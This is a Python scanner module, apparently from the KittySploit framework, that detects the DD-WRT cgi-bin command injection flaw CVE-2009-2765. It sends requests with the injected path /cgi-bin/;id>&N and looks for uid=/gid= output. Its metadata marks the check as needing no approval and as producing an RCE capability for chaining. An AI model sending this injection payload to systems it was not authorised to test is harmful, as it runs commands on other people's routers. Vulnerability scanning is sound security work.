#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DD-WRT cgi-bin command injection (CVE-2009-2765)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'DD-WRT - cgi-bin Command Injection Detection (CVE-2009-2765)',
        'description': (
            'Detects CVE-2009-2765 by requesting /cgi-bin/;id>&N and matching uid=/gid=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2009', 'dd-wrt', 'router', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2009-2765',
        ],
        'cve': 'CVE-2009-2765',
    }

    def run(self):
        for i in range(1, 4):
            path = f'/cgi-bin/;id>&{i}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and 'uid=' in (r.text or '') and 'gid=' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='DD-WRT cgi-bin RCE (CVE-2009-2765)',
                    path='/cgi-bin/',
                )
                return True
        return False
